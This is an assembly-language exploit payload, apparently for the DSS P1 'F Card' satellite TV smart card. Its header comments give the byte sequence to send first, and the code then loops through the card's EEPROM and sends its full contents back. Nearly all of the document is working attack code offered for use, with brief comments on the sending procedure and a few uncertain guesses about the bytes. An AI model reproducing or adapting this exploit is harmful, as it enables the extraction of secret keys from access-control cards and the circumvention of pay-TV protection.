;;; This is an old exploit for the DSS P1 "F Card".  To use it, first
;;; send 48 42 AA 00 70, then receive 42 as an acknowledgment before
;;; sending this file along.  The EEPROM will be returned.

;;; I don't know who wrote this, but kind thanks to Chris Gerlinsky
;;; for passing it and some supporting materials my way. --Travis

	
	.lang fcard

        sub @0x0057, x		; No idea.  Maybe "50 57" are important bytes?
bigloop:	
        lda @0x0088		; Increment high (page) byte in subroutine at 0x87.
        inc a
        sta @0x0088
        cmp #0x0011		; Are we at 0x1100, the end of EEPROM?
        bne smallloop		; Count more small bytes if not.
idleloop:
        lda #0x00ee
        jsr 0x1e7f
        jsr 0x1f31
        bra idleloop		; Send EE forever.
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        nop
        rsp
        .db 0xaf		; Maybe "AF 08" are important bytes?
        .db 0x08
ENTRY:				; 0x28 bytes into packet.  Not sure of absolute address.
        lda #0x0004		; Loads 43 00 05 04 to 0x87.
        sta @0x008a		; 0x87: lda @5
        lda #0x0005		; 0x8A: rts
        sta @0x0088
        lda #0x0000
        sta @0x0089
        lda #0x0043
        sta @0x0087
smallloop:	
        jsr 0x0087		; Jump to 'lda' subroutine at 0x87.
        jsr 0x1e7f
        jsr 0x1f31
        lda @0x0089		; Increment low byte of LDA sub's target.
        inc a
        sta @0x0089
        bne smallloop		; Send some more bytes from the page.
        bra bigloop		; Send the next page.
        sbc #0x0000
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
        rti
